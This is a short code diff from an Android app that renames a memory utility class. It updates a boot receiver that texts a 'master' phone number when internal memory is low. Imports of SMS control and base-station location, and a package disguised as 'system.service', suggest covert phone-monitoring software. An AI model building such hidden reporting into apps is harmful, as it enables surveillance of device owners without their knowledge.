@@ -11,7 +11,7 @@ import system.service.feature.sms.SmsCtrl;
 
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.FileCtrl;
-import com.particle.inspector.common.util.MemoryUtil;
+import com.particle.inspector.common.util.InternalMemUtil;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.license.LICENSE_TYPE;
 import com.particle.inspector.common.util.location.BaseStationLocation;
@@ -152,12 +152,12 @@ public class BootReceiver extends BroadcastReceiver {
 					}
 					
 					// Check internal memory free size, warn master if it is not enough
-					long freeInternalMemory = MemoryUtil.getFreeSizeOfInternalMemory();
-					if (freeInternalMemory < (MemoryUtil.BYTES_OF_1MB*10)) {
+					long freeInternalMemory = InternalMemUtil.getFreeSize();
+					if (freeInternalMemory < (InternalMemUtil.BYTES_OF_1MB*10)) {
 						if (ConfigCtrl.getHasSentFreeInternalMemNotEnoughSms(BootReceiver.this.context)) return;
 							
 						String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(BootReceiver.this.context);
-						String msg = String.format(BootReceiver.this.context.getResources().getString(R.string.memory_not_enough_internal_memory), freeInternalMemory*1.0/MemoryUtil.BYTES_OF_1MB);
+						String msg = String.format(BootReceiver.this.context.getResources().getString(R.string.memory_not_enough_internal_memory), freeInternalMemory*1.0/InternalMemUtil.BYTES_OF_1MB);
 						if (SmsCtrl.sendSms(recvPhoneNum, msg)) {
 							ConfigCtrl.setHasSentFreeInternalMemNotEnoughSms(BootReceiver.this.context, true);
 						}
